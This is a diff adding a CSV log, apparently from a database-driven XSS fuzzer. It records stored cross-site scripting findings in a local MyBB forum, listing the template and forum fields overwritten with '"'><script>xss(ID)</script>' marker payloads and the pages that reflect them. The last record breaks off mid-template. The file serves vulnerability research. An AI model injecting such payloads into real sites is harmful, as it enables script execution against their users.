@@ -1,0 +1,1600 @@
+web app,DB source,reflection sink,id,payload,description
+mybb,mybb_templates.template,http://localhost/mybb/member.php?action=register,903887,"""'><script>xss(903887)</script>","
+            mybb.mybb_templates.template[251][2]
+            original row: [252, 'member_register_agreement', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']} - {$lang->agreement}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n<br />\n<form action=""member.php"" method=""post"">\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td class=""thead""><strong>{$mybb->settings[\'bbname\']} - {$lang->agreement}</strong></td>\n</tr>\n{$coppa_agreement}\n<tr>\n<td class=""trow1"">\n<p>{$lang->agreement_1}</p>\n<p>{$lang->agreement_2}</p>\n<p>{$lang->agreement_3}</p>\n<p>{$lang->agreement_4}</p>\n<p><strong>{$lang->agreement_5}</strong></p>\n</td>\n</tr>\n</table>\n\n<br />\n<div align=""center"">\n<input type=""hidden"" name=""step"" value=""agreement"" />\n<input type=""hidden"" name=""action"" value=""register"" />\n<input type=""submit"" class=""button"" name=""agree"" value=""{$lang->i_agree}"" />\n</div>\n</form>\n{$footer}\n</body>\n</html>', -2, '123', '', 1676537388]
+            fuzzed row: [252, 'member_register_agreement', '""\'><script>xss(903887)</script>', -2, '123', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->agreement}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+<br />
+<form action=""member.php"" method=""post"">
+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td class=""thead""><strong>{$mybb->settings['bbname']} - {$lang->agreement}</strong></td>
+</tr>
+{$coppa_agreement}
+<tr>
+<td class=""trow1"">
+<p>{$lang->agreement_1}</p>
+<p>{$lang->agreement_2}</p>
+<p>{$lang->agreement_3}</p>
+<p>{$lang->agreement_4}</p>
+<p><strong>{$lang->agreement_5}</strong></p>
+</td>
+</tr>
+</table>
+
+<br />
+<div align=""center"">
+<input type=""hidden"" name=""step"" value=""agreement"" />
+<input type=""hidden"" name=""action"" value=""register"" />
+<input type=""submit"" class=""button"" name=""agree"" value=""{$lang->i_agree}"" />
+</div>
+</form>
+{$footer}
+</body>
+</html>' => '""'><script>xss(903887)</script>'
+            
+fuzzed after scan 199 / 302
+found as XSS in scan 200 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/memberlist.php?action=search,911591,"""'><script>xss(911591)</script>","
+            mybb.mybb_templates.template[276][2]
+            original row: [277, 'memberlist_search', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']} - {$lang->search_member_list}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n<form method=""post"" action=""memberlist.php"">\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td class=""thead"" colspan=""2""><strong>{$lang->search_member_list}</strong></td>\n</tr>\n<tr>\n\t<td class=""tcat"" colspan=""2""><strong>{$lang->search_criteria}</strong></td>\n</tr>\n<tr>\n\t<td class=""trow1"" style=""vertical-align: top;"" width=""20%""><strong><label for=""username"">{$lang->username}</label></strong></td>\n\t<td class=""trow1"">\n\t\t<select name=""username_match"">\n\t\t\t<option value=""begins"">{$lang->begins_with}</option>\n\t\t\t<option value=""contains"">{$lang->username_contains}</option>\n\t\t\t<option value=""exact"">{$lang->username_exact}</option>\n\t\t</select>\n\t\t&nbsp;\n\t\t<input type=""text"" class=""textbox"" name=""username"" id=""username"" />\n\t</td>\n</tr>\n<tr>\n\t<td class=""trow2"" width=""20%""><strong><label for=""website"">{$lang->search_website}</label></strong></td>\n\t<td class=""trow2"">\n\t\t<input type=""text"" class=""textbox"" name=""website"" id=""website"" />\n\t</td>\n</tr>\n{$contact_fields[\'skype\']}\n{$contact_fields[\'google\']}\n{$contact_fields[\'icq\']}\n<tr>\n\t<td class=""tcat"" colspan=""2""><strong>{$lang->search_options}</strong></td>\n</tr>\n<tr>\n\t<td class=""trow1"" width=""20%""><strong><label for=""sort"">{$lang->sort_by}</label></strong></td>\n\t<td class=""trow1"">\n\t\t<select name=""sort"" id=""sort"">\n\t\t\t<option value=""username"">{$lang->sort_by_username}</option>\n\t\t\t<option value=""regdate"">{$lang->sort_by_regdate}</option>\n\t\t\t<option value=""lastvisit"">{$lang->sort_by_lastvisit}</option>\n\t\t\t<option value=""postnum"">{$lang->sort_by_posts}</option>\n\t\t\t<option value=""threadnum"">{$lang->sort_by_threads}</option>\n\t\t\t{$referrals_option}\n\t\t</select><br />\n\t\t<span class=""smalltext"">\n\t\t<input type=""radio"" class=""radio"" name=""order"" id=""order_asc"" value=""asc"" /> <label for=""order_asc"">{$lang->order_asc}</label><br />\n\t\t<input type=""radio"" class=""radio"" name=""order"" id=""order_desc"" value=""desc"" checked=""checked"" /> <label for=""order_desc"">{$lang->order_desc}</label>\n\t\t</span>\n\t</td>\n</tr>\n<tr>\n\t<td class=""trow1"" width=""20%""><strong><label for=""perpage"">{$lang->per_page}</label></strong></td>\n\t<td class=""trow1"">\n\t\t<input type=""text"" class=""textbox"" size=""4"" name=""perpage"" id=""perpage"" value=""15"" />\n\t</td>\n</tr>\n</table>\n<div align=""center""><br /><input type=""submit"" class=""button"" name=""submit"" value=""{$lang->search}"" /></div>\n</form>\n{$footer}\n<link rel=""stylesheet"" href=""{$mybb->asset_url}/jscripts/select2/select2.css?ver=1807"">\n<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/select2/select2.min.js?ver=1806""></script>\n<script type=""text/javascript"">\n<!--\nif(use_xmlhttprequest == ""1"")\n{\n\tMyBB.select2();\n\t$(""#username"").select2({\n\t\tplaceholder: ""{$lang->search_user}"",\n\t\tminimumInputLength: 2,\n\t\tmultiple: false,\n\t\tallowClear: true,\n\t\tajax: { // instead of writing the function to execute the request we use Select2\'s convenient helper\n\t\t\turl: ""xmlhttp.php?action=get_users"",\n\t\t\tdataType: \'json\',\n\t\t\tdata: function (term, page) {\n\t\t\t\treturn {\n\t\t\t\t\tquery: term, // search term\n\t\t\t\t};\n\t\t\t},\n\t\t\tresults: function (data, page) { // parse the results into the format expected by Select2.\n\t\t\t\t// since we are using custom formatting functions we do not need to alter remote JSON data\n\t\t\t\treturn {results: data};\n\t\t\t}\n\t\t},\n\t\tinitSelection: function(element, callback) {\n\t\t\tvar value = $(element).val();\n\t\t\tif (value !== """") {\n\t\t\t\tcallback({\n\t\t\t\t\tid: value,\n\t\t\t\t\ttext: value\n\t\t\t\t});\n\t\t\t}\n\t\t},\n       // Allow the user entered text to be selected as well\n       createSearchChoice:function(term, data) {\n\t\t\tif ( $(data).filter( function() {\n\t\t\t\treturn this.text.localeCompare(term)===0;\n\t\t\t}).length===0) {\n\t\t\t\treturn {id:term, text:term};\n\t\t\t}\n\t\t},\n\t});\n\n  \t$(\'[for=username]\').on(\'click\', function(){\n\t\t$(""#username"").select2(\'open\');\n\t\treturn false;\n\t});\n}\n// -->\n</script>\n</body>\n</html>', -2, '1823', '', 1676537388]
+            fuzzed row: [277, 'memberlist_search', '""\'><script>xss(911591)</script>', -2, '1823', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->search_member_list}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+<form method=""post"" action=""memberlist.php"">
+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td class=""thead"" colspan=""2""><strong>{$lang->search_member_list}</strong></td>
+</tr>
+<tr>
+	<td class=""tcat"" colspan=""2""><strong>{$lang->search_criteria}</strong></td>
+</tr>
+<tr>
+	<td class=""trow1"" style=""vertical-align: top;"" width=""20%""><strong><label for=""username"">{$lang->username}</label></strong></td>
+	<td class=""trow1"">
+		<select name=""username_match"">
+			<option value=""begins"">{$lang->begins_with}</option>
+			<option value=""contains"">{$lang->username_contains}</option>
+			<option value=""exact"">{$lang->username_exact}</option>
+		</select>
+		&nbsp;
+		<input type=""text"" class=""textbox"" name=""username"" id=""username"" />
+	</td>
+</tr>
+<tr>
+	<td class=""trow2"" width=""20%""><strong><label for=""website"">{$lang->search_website}</label></strong></td>
+	<td class=""trow2"">
+		<input type=""text"" class=""textbox"" name=""website"" id=""website"" />
+	</td>
+</tr>
+{$contact_fields['skype']}
+{$contact_fields['google']}
+{$contact_fields['icq']}
+<tr>
+	<td class=""tcat"" colspan=""2""><strong>{$lang->search_options}</strong></td>
+</tr>
+<tr>
+	<td class=""trow1"" width=""20%""><strong><label for=""sort"">{$lang->sort_by}</label></strong></td>
+	<td class=""trow1"">
+		<select name=""sort"" id=""sort"">
+			<option value=""username"">{$lang->sort_by_username}</option>
+			<option value=""regdate"">{$lang->sort_by_regdate}</option>
+			<option value=""lastvisit"">{$lang->sort_by_lastvisit}</option>
+			<option value=""postnum"">{$lang->sort_by_posts}</option>
+			<option value=""threadnum"">{$lang->sort_by_threads}</option>
+			{$referrals_option}
+		</select><br />
+		<span class=""smalltext"">
+		<input type=""radio"" class=""radio"" name=""order"" id=""order_asc"" value=""asc"" /> <label for=""order_asc"">{$lang->order_asc}</label><br />
+		<input type=""radio"" class=""radio"" name=""order"" id=""order_desc"" value=""desc"" checked=""checked"" /> <label for=""order_desc"">{$lang->order_desc}</label>
+		</span>
+	</td>
+</tr>
+<tr>
+	<td class=""trow1"" width=""20%""><strong><label for=""perpage"">{$lang->per_page}</label></strong></td>
+	<td class=""trow1"">
+		<input type=""text"" class=""textbox"" size=""4"" name=""perpage"" id=""perpage"" value=""15"" />
+	</td>
+</tr>
+</table>
+<div align=""center""><br /><input type=""submit"" class=""button"" name=""submit"" value=""{$lang->search}"" /></div>
+</form>
+{$footer}
+<link rel=""stylesheet"" href=""{$mybb->asset_url}/jscripts/select2/select2.css?ver=1807"">
+<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/select2/select2.min.js?ver=1806""></script>
+<script type=""text/javascript"">
+<!--
+if(use_xmlhttprequest == ""1"")
+{
+	MyBB.select2();
+	$(""#username"").select2({
+		placeholder: ""{$lang->search_user}"",
+		minimumInputLength: 2,
+		multiple: false,
+		allowClear: true,
+		ajax: { // instead of writing the function to execute the request we use Select2's convenient helper
+			url: ""xmlhttp.php?action=get_users"",
+			dataType: 'json',
+			data: function (term, page) {
+				return {
+					query: term, // search term
+				};
+			},
+			results: function (data, page) { // parse the results into the format expected by Select2.
+				// since we are using custom formatting functions we do not need to alter remote JSON data
+				return {results: data};
+			}
+		},
+		initSelection: function(element, callback) {
+			var value = $(element).val();
+			if (value !== """") {
+				callback({
+					id: value,
+					text: value
+				});
+			}
+		},
+       // Allow the user entered text to be selected as well
+       createSearchChoice:function(term, data) {
+			if ( $(data).filter( function() {
+				return this.text.localeCompare(term)===0;
+			}).length===0) {
+				return {id:term, text:term};
+			}
+		},
+	});
+
+  	$('[for=username]').on('click', function(){
+		$(""#username"").select2('open');
+		return false;
+	});
+}
+// -->
+</script>
+</body>
+</html>' => '""'><script>xss(911591)</script>'
+            
+fuzzed after scan 199 / 302
+found as XSS in scan 200 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/
+http://localhost/mybb/#top
+http://localhost/mybb/calendar.php
+http://localhost/mybb/calendar.php?calendar=1
+http://localhost/mybb/contact.php
+http://localhost/mybb/forumdisplay.php?fid=1
+http://localhost/mybb/forumdisplay.php?fid=2
+http://localhost/mybb/index.php
+http://localhost/mybb/index.php#top
+http://localhost/mybb/member.php?action=emailuser&uid=
+http://localhost/mybb/member.php?action=login
+http://localhost/mybb/member.php?action=lostpw
+http://localhost/mybb/member.php?action=profile&uid=
+http://localhost/mybb/member.php?action=register
+http://localhost/mybb/memberlist.php
+http://localhost/mybb/memberlist.php?action=search
+http://localhost/mybb/misc.php?action=help
+http://localhost/mybb/misc.php?action=markread
+http://localhost/mybb/misc.php?action=syndication
+http://localhost/mybb/online.php
+http://localhost/mybb/online.php#top
+http://localhost/mybb/online.php?action=today
+http://localhost/mybb/online.php?sortby=location
+http://localhost/mybb/online.php?sortby=time
+http://localhost/mybb/online.php?sortby=username
+http://localhost/mybb/portal.php
+http://localhost/mybb/portal.php#top
+http://localhost/mybb/search.php
+http://localhost/mybb/search.php#top
+http://localhost/mybb/showteam.php
+http://localhost/mybb/stats.php
+http://localhost/mybb/stats.php#top",911609,"""'><script>xss(911609)</script>","
+            mybb.mybb_templates.template[965][2]
+            original row: [966, 'htmldoctype', '<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">', -2, '120', '', 1676537388]
+            fuzzed row: [966, 'htmldoctype', '""\'><script>xss(911609)</script>', -2, '120', '', 1676537388]
+            change: '<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">' => '""'><script>xss(911609)</script>'
+            
+fuzzed after scan 216 / 302
+found as XSS in scan 217 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/calendar.php
+http://localhost/mybb/calendar.php?calendar=1
+http://localhost/mybb/contact.php
+http://localhost/mybb/forumdisplay.php?fid=1
+http://localhost/mybb/forumdisplay.php?fid=2
+http://localhost/mybb/member.php?action=emailuser&uid=
+http://localhost/mybb/member.php?action=login
+http://localhost/mybb/member.php?action=lostpw
+http://localhost/mybb/member.php?action=profile&uid=
+http://localhost/mybb/member.php?action=register
+http://localhost/mybb/memberlist.php
+http://localhost/mybb/memberlist.php?action=search
+http://localhost/mybb/misc.php?action=help
+http://localhost/mybb/misc.php?action=syndication
+http://localhost/mybb/online.php
+http://localhost/mybb/online.php#top
+http://localhost/mybb/online.php?action=today
+http://localhost/mybb/online.php?sortby=location
+http://localhost/mybb/online.php?sortby=time
+http://localhost/mybb/online.php?sortby=username
+http://localhost/mybb/portal.php
+http://localhost/mybb/portal.php#top
+http://localhost/mybb/search.php
+http://localhost/mybb/search.php#top
+http://localhost/mybb/showteam.php
+http://localhost/mybb/stats.php
+http://localhost/mybb/stats.php#top",925162,"""'><script>xss(925162)</script>","
+            mybb.mybb_templates.template[159][2]
+            original row: [160, 'header', '<div id=""container"">\n\t\t<a name=""top"" id=""top""></a>\n\t\t<div id=""header"">\n\t\t\t<div id=""logo"">\n\t\t\t\t<div class=""wrapper"">\n\t\t\t\t\t<a href=""{$mybb->settings[\'bburl\']}/index.php""><img src=""{$theme[\'logo\']}"" alt=""{$mybb->settings[\'bbname\']}"" title=""{$mybb->settings[\'bbname\']}"" /></a>\n\t\t\t\t\t<ul class=""menu top_links"">\n\t\t\t\t\t\t{$menu_portal}\n\t\t\t\t\t\t{$menu_search}\n\t\t\t\t\t\t{$menu_memberlist}\n\t\t\t\t\t\t{$menu_calendar}\n\t\t\t\t\t\t<li><a href=""{$mybb->settings[\'bburl\']}/misc.php?action=help"" class=""help"">{$lang->toplinks_help}</a></li>\n\t\t\t\t\t</ul>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t\t<div id=""panel"">\n\t\t\t\t<div class=""upper"">\n\t\t\t\t\t<div class=""wrapper"">\n\t\t\t\t\t\t{$quicksearch}\n\t\t\t\t\t\t{$welcomeblock}\n\t\t\t\t\t<!-- </div> in header_welcomeblock_member and header_welcomeblock_guest -->\n\t\t\t\t<!-- </div> in header_welcomeblock_member and header_welcomeblock_guest -->\n\t\t\t</div>\n\t\t</div>\n\t\t<div id=""content"">\n\t\t\t<div class=""wrapper"">\n\t\t\t\t{$pm_notice}\n\t\t\t\t{$remote_avatar_notice}\n\t\t\t\t{$bannedwarning}\n\t\t\t\t{$bbclosedwarning}\n\t\t\t\t{$modnotice}\n\t\t\t\t{$pending_joinrequests}\n\t\t\t\t{$awaitingusers}\n\t\t\t\t<navigation>\n\t\t\t\t<br />', -2, '1820', '', 1676537388]
+            fuzzed row: [160, 'header', '""\'><script>xss(925162)</script>', -2, '1820', '', 1676537388]
+            change: '<div id=""container"">
+		<a name=""top"" id=""top""></a>
+		<div id=""header"">
+			<div id=""logo"">
+				<div class=""wrapper"">
+					<a href=""{$mybb->settings['bburl']}/index.php""><img src=""{$theme['logo']}"" alt=""{$mybb->settings['bbname']}"" title=""{$mybb->settings['bbname']}"" /></a>
+					<ul class=""menu top_links"">
+						{$menu_portal}
+						{$menu_search}
+						{$menu_memberlist}
+						{$menu_calendar}
+						<li><a href=""{$mybb->settings['bburl']}/misc.php?action=help"" class=""help"">{$lang->toplinks_help}</a></li>
+					</ul>
+				</div>
+			</div>
+			<div id=""panel"">
+				<div class=""upper"">
+					<div class=""wrapper"">
+						{$quicksearch}
+						{$welcomeblock}
+					<!-- </div> in header_welcomeblock_member and header_welcomeblock_guest -->
+				<!-- </div> in header_welcomeblock_member and header_welcomeblock_guest -->
+			</div>
+		</div>
+		<div id=""content"">
+			<div class=""wrapper"">
+				{$pm_notice}
+				{$remote_avatar_notice}
+				{$bannedwarning}
+				{$bbclosedwarning}
+				{$modnotice}
+				{$pending_joinrequests}
+				{$awaitingusers}
+				<navigation>
+				<br />' => '""'><script>xss(925162)</script>'
+            
+fuzzed after scan 196 / 302
+found as XSS in scan 197 / 302"
+mybb,mybb_forums.linkto,"http://localhost/mybb/archive/index.php
+http://localhost/mybb/archive/index.php?forum-1.html",927773,"""'><script>xss(927773)</script>","
+            mybb.mybb_forums.linkto[1][3]
+            original row: [2, 'My Forum', '', '', 'f', 1, '1,2', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            fuzzed row: [2, 'My Forum', '', '""\'><script>xss(927773)</script>', 'f', 1, '1,2', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            change: '' => '""'><script>xss(927773)</script>'
+            
+fuzzed after scan 26 / 302
+found as XSS in scan 27 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/forumdisplay.php?fid=1
+http://localhost/mybb/forumdisplay.php?fid=2",929991,"""'><script>xss(929991)</script>","
+            mybb.mybb_templates.template[88][2]
+            original row: [89, 'forumdisplay', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']} - {$foruminfo[\'name\']} </title>\n{$headerinclude}\n{$rssdiscovery}\n<script type=""text/javascript"">\n<!--\n\tlang.no_new_posts = ""{$lang->no_new_posts}"";\n\tlang.click_mark_read = ""{$lang->click_mark_read}"";\n\tlang.inline_edit_description = ""{$lang->inline_edit_description}"";\n\tlang.post_fetch_error = ""{$lang->post_fetch_error}"";\n// -->\n</script>\n<!-- jeditable (jquery) -->\n<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/jeditable/jeditable.min.js""></script>\n<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/inline_edit.js?ver=1821""></script>\n</head>\n<body>\n{$header}\n{$moderatedby}\n{$usersbrowsing}\n{$rules}\n{$subforums}\n{$threadslist}\n{$footer}\n</body>\n</html>', -2, '1821', '', 1676537388]
+            fuzzed row: [89, 'forumdisplay', '""\'><script>xss(929991)</script>', -2, '1821', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$foruminfo['name']} </title>
+{$headerinclude}
+{$rssdiscovery}
+<script type=""text/javascript"">
+<!--
+	lang.no_new_posts = ""{$lang->no_new_posts}"";
+	lang.click_mark_read = ""{$lang->click_mark_read}"";
+	lang.inline_edit_description = ""{$lang->inline_edit_description}"";
+	lang.post_fetch_error = ""{$lang->post_fetch_error}"";
+// -->
+</script>
+<!-- jeditable (jquery) -->
+<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/jeditable/jeditable.min.js""></script>
+<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/inline_edit.js?ver=1821""></script>
+</head>
+<body>
+{$header}
+{$moderatedby}
+{$usersbrowsing}
+{$rules}
+{$subforums}
+{$threadslist}
+{$footer}
+</body>
+</html>' => '""'><script>xss(929991)</script>'
+            
+fuzzed after scan 194 / 302
+found as XSS in scan 195 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/memberlist.php,930647,"""'><script>xss(930647)</script>","
+            mybb.mybb_templates.template[272][2]
+            original row: [273, 'memberlist', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']} - {$lang->member_list}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n{$multipage}\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td class=""thead"" colspan=""{$colspan}"">\n\t<div class=""float_right"">\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->a}"" style=""padding: 5px;"">{$lang->a}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->b}"" style=""padding: 5px;"">{$lang->b}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->c}"" style=""padding: 5px;"">{$lang->c}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->d}"" style=""padding: 5px;"">{$lang->d}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->e}"" style=""padding: 5px;"">{$lang->e}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->f}"" style=""padding: 5px;"">{$lang->f}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->g}"" style=""padding: 5px;"">{$lang->g}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->h}"" style=""padding: 5px;"">{$lang->h}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->i}"" style=""padding: 5px;"">{$lang->i}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->j}"" style=""padding: 5px;"">{$lang->j}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->k}"" style=""padding: 5px;"">{$lang->k}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->l}"" style=""padding: 5px;"">{$lang->l}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->m}"" style=""padding: 5px;"">{$lang->m}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->n}"" style=""padding: 5px;"">{$lang->n}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->o}"" style=""padding: 5px;"">{$lang->o}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->p}"" style=""padding: 5px;"">{$lang->p}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->q}"" style=""padding: 5px;"">{$lang->q}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->r}"" style=""padding: 5px;"">{$lang->r}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->s}"" style=""padding: 5px;"">{$lang->s}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->t}"" style=""padding: 5px;"">{$lang->t}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->u}"" style=""padding: 5px;"">{$lang->u}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->v}"" style=""padding: 5px;"">{$lang->v}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->w}"" style=""padding: 5px;"">{$lang->w}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->x}"" style=""padding: 5px;"">{$lang->x}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->y}"" style=""padding: 5px;"">{$lang->y}</a>\n\t\t<a href=""memberlist.php?username_match=begins&amp;username={$lang->z}"" style=""padding: 5px;"">{$lang->z}</a>\n\t</div>\n\t<div><strong>{$lang->member_list}</strong></div></td>\n</tr>\n<tr>\n<td class=""tcat"" width=""1%""><span class=""smalltext""><strong>{$lang->avatar}</strong></span></td>\n<td class=""tcat""><span class=""smalltext""><a href=""{$sorturl}&amp;sort=username&amp;order=ascending""><strong>{$lang->username}</strong></a> {$orderarrow[\'username\']}</span></td>\n<td class=""tcat"" width=""15%"" align=""center""><span class=""smalltext""><a href=""{$sorturl}&amp;sort=regdate&amp;order=ascending""><strong>{$lang->joined}</strong></a> {$orderarrow[\'regdate\']}</span></td>\n<td class=""tcat"" width=""15%"" align=""center""><span class=""smalltext""><a href=""{$sorturl}&amp;sort=lastvisit&amp;order=descending""><strong>{$lang->lastvisit}</strong></a> {$orderarrow[\'lastvisit\']}</span></td>\n<td class=""tcat"" width=""10%"" align=""center""><span class=""smalltext""><a href=""{$sorturl}&amp;sort=postnum&amp;order=descending""><strong>{$lang->posts}</strong></a> {$orderarrow[\'postnum\']}</span></td>\n<td class=""tcat"" width=""10%"" align=""center""><span class=""smalltext""><a href=""{$sorturl}&amp;sort=threadnum&amp;order=descending""><strong>{$lang->threads}</strong></a> {$orderarrow[\'threadnum\']}</span></td>\n{$referral_header}\n</tr>\n{$users}\n</table>\n{$multipage}\n<br class=""clear"" />\n<br />\n<form method=""post"" action=""memberlist.php"">\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td class=""thead"" colspan=""3"">\n\t<div class=""float_right"">\n\t\t<strong><a href=""memberlist.php?action=search"">{$lang->advanced_search}</a></strong>\n\t</div>\n\t<div><strong>{$lang->search_members}</strong></div>\n</td>\n</tr>\n<tr>\n\t<td class=""tcat""><strong><label for=""username"">{$lang->username}</label></strong></td>\n\t<td class=""tcat""><strong><label for=""website"">{$lang->website}</label></strong></td>\n\t<td class=""tcat""><strong><label for=""sort"">{$lang->sort_by}</label></strong></td>\n</tr>\n<tr>\n\t<td class=""trow1"" width=""33%"" style=""vertical-align: top;"">\n\t\t{$lang->exactly}<br />\n\t\t<input type=""text"" class=""textbox"" name=""username"" id=""username"" style=""width: 99%; margin-top: 4px;"" value=""{$search_username}"" />\n\t</td>\n\t<td class=""trow1"" width=""33%"" style=""vertical-align: top;"">\n\t\t{$lang->contains}<br />\n\t\t<input type=""text"" class=""textbox"" name=""website"" id=""website"" style=""width: 99%; margin-top: 4px;"" value=""{$search_website}"" />\n\t</td>\n\t<td class=""trow1"" width=""33%"">\n\t\t<div class=""smalltext"" style=""margin-bottom: 3px;"">\n\t\t\t<input type=""radio"" class=""radio"" name=""order"" id=""order_asc"" value=""ascending""{$order_check[\'ascending\']} /> <label for=""order_asc"">{$lang->order_asc}</label>&nbsp;\n\t\t\t<input type=""radio"" class=""radio"" name=""order"" id=""order_desc"" value=""descending""{$order_check[\'descending\']} /> <label for=""order_desc"">{$lang->order_desc}</label>\n\t\t</div>\n\t\t<select name=""sort"" id=""sort"" style=""width: 99%;"">\n\t\t\t<option value=""username""{$sort_selected[\'username\']}>{$lang->sort_by_username}</option>\n\t\t\t<option value=""regdate""{$sort_selected[\'regdate\']}>{$lang->sort_by_regdate}</option>\n\t\t\t<option value=""lastvisit""{$sort_selected[\'lastvisit\']}>{$lang->sort_by_lastvisit}</option>\n\t\t\t<option value=""postnum""{$sort_selected[\'postnum\']}>{$lang->sort_by_posts}</option>\n\t\t\t<option value=""threadnum""{$sort_selected[\'threadnum\']}>{$lang->sort_by_threads}</option>\n\t\t\t{$referrals_option}\n\t\t</select>\n\t</td>\n</tr>\n</table>\n<div align=""center""><br /><input type=""submit"" class=""button"" name=""submit"" value=""{$lang->search}"" /></div>\n</form>\n{$footer}\n<link rel=""stylesheet"" href=""{$mybb->asset_url}/jscripts/select2/select2.css?ver=1807"">\n<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/select2/select2.min.js?ver=1806""></script>\n<script type=""text/javascript"">\n<!--\nif(use_xmlhttprequest == ""1"")\n{\n\tMyBB.select2();\n\t$(""#username"").select2({\n\t\tplaceholder: ""{$lang->search_user}"",\n\t\tminimumInputLength: 2,\n\t\tmultiple: false,\n\t\tallowClear: true,\n\t\tajax: { // instead of writing the function to execute the request we use Select2\'s convenient helper\n\t\t\turl: ""xmlhttp.php?action=get_users"",\n\t\t\tdataType: \'json\',\n\t\t\tdata: function (term, page) {\n\t\t\t\treturn {\n\t\t\t\t\tquery: term, // search term\n\t\t\t\t};\n\t\t\t},\n\t\t\tresults: function (data, page) { // parse the results into the format expected by Select2.\n\t\t\t\t// since we are using custom formatting functions we do not need to alter remote JSON data\n\t\t\t\treturn {results: data};\n\t\t\t}\n\t\t},\n\t\tinitSelection: function(element, callback) {\n\t\t\tvar value = $(element).val();\n\t\t\tif (value !== """") {\n\t\t\t\tcallback({\n\t\t\t\t\tid: value,\n\t\t\t\t\ttext: value\n\t\t\t\t});\n\t\t\t}\n\t\t},\n       // Allow the user entered text to be selected as well\n       createSearchChoice:function(term, data) {\n\t\t\tif ( $(data).filter( function() {\n\t\t\t\treturn this.text.localeCompare(term)===0;\n\t\t\t}).length===0) {\n\t\t\t\treturn {id:term, text:term};\n\t\t\t}\n\t\t},\n\t});\n\n  \t$(\'[for=username]\').on(\'click\', function(){\n\t\t$(""#username"").select2(\'open\');\n\t\treturn false;\n\t});\n}\n// -->\n</script>\n</body>\n</html>', -2, '1823', '', 1676537388]
+            fuzzed row: [273, 'memberlist', '""\'><script>xss(930647)</script>', -2, '1823', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->member_list}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+{$multipage}
